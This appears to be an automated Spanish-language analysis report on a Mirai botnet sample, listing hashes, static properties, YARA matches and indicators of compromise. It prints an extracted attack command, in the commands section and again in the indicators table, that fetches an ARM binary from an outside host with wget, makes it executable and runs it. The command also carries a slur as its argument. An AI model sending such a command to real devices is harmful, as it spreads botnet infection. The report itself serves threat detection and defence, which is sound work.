# 🧬 Payload Analysis

`acf265e07fbb979a4bd91d2f322b9089153c7ace051af7ad71172888cb7b5342`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos. Una detección YARA válida respalda el análisis.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Alta`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:27:32.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `acf265e07fbb979a4bd91d2f322b9089153c7ace051af7ad71172888cb7b5342`
- **MD5:** `75f70fd74727e7163226363fad561e76`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (1114), with CRLF line terminators |
| Tamaño | 1.4 KiB |
| Entropía | 5.12 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- YARA match: mirai

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;wget+http:/\/94.154.43.XXX/manji.arm4;chmod+777+manji.arm4;./manji.arm4+jews;wget+http:/\/94.154.43.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.164.XXX | static_analysis |
| ip | 94.154.43.XXX | static_analysis |
| command | GET /shell?cd+/tmp;wget+http:/\/94.154.43.XXX/manji.arm4;chmod+777+manji.arm4;./manji.arm4+jews;wget+http:/\/94.154.43.XXX | strings |
| hash | acf265e07fbb979a4bd91d2f322b9089153c7ace051af7ad71172888cb7b5342 | static_analysis |

## 🧬 Detecciones YARA

| Regla | Familia | Severidad | Confianza |
| --- | --- | --- | --- |
| Suspicious_BusyBox_Mirai |  | medium | medium |

Detalle completo: [`detections.md`](detections.md).

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
